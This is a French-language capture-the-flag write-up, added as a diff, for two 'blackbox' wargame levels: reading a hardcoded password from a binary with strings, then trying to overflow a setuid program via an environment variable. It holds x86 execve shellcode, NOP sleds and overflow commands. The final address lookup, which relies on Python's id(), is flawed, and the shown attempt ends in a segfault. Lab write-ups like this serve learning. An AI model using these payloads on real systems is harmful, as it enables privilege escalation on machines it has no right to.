@@ -1,0 +1,75 @@
+Level1 :
+L'objectif est de récupérer le mot de passe du fichier login2.
+La vulnérabilité est la non protection des strings de l'exécutable, récupérable
+via la commande :
+level1@blackbox:~$ strings login2
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+printf
+fgets
+puts
+system
+stdin
+strncmp
+_IO_stdin_used
+__libc_start_main
+GLIBC_2.0
+PTRh
+QVhT
+[^_]
+[^_]
+PassFor2
+Access Code:
+/bin/sh
+Access Denied!
+
+On voit alors le potentiel mot de passe PassFor2. On le test :
+
+level1@blackbox:~$ ./login2
+Access Code: PassFor2
+sh-3.1$
+
+Level2 :
+L'objectif de level2 est d'aller lire le fichier password de level3 grace au
+setuid de level3 sur l'exécutable getowner.
+
+level2@blackbox:~$ export filename=`perl -e 'print "A"x128'`; ./getowner
+The owner of this file is: 1003
+level2@blackbox:~$ export filename=`perl -e 'print "A"x132'`; ./getowner
+The owner of this file is: -1207961948
+level2@blackbox:~$ export filename=`perl -e 'print "A"x136'`; ./getowner
+The owner of this file is: 1003
+Segmentation fault
+
+On découvre l'adresse de retour à buffer + 4 pour l'exploit du bufferoverflow.
+On écrit un shellcode précédé de NOP pour récupérer un shell en level3:
+
+level2@blackbox:~$ export filename=``perl -e 'print "\x90"x96, "\x31\xc0\x89\xc3
+\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52
+\x53\x89\xe1\x8d\x42\x0b\xcd\x80", "a"x4, "Adresse dans la zone NOP"'`; ./getowner
+
+On doit maintenant récupérer une adresse dans la zone de NOP qu'on écrit devant
+notre shellcode.
+
+Après avoir essayé plusieurs adresses différentes, on remarque que le shellcode
+ne peut pas s'exécuter à cause des protection sur la stack.
+
+On test en mettant le shellcode dans une variable d'environnement :
+level2@blackbox:~$ export SHELL=`python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
+
+Pour utiliser cette variable, nous devons trouver son adresse dans la mémoire.
+Pour cela nous utilisons python :
+>>> import os
+>>> os.environ.get('SHELL')
+'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j\x0bX\x99Rfh-p\x89\xe1Rjhh/bash/bin\x89\xe3RQS\x89\xe1\xcd\x80'
+>>> id(os.environ.get('SHELL'))
+-1209700160
+>>> hex(id(os.environ.get('SHELL')))
+'-0x481a8f40'
+
+On test ensuite avec cette adresse :
+level2@blackbox:~$ export filename=`python -c 'import struct; import os; print "A" * 151 + struct.pack("<L", -0x481a8f40)'`
+level2@blackbox:~$ ./getowner
+The owner of this file is: -1207961948
+Segmentation fault
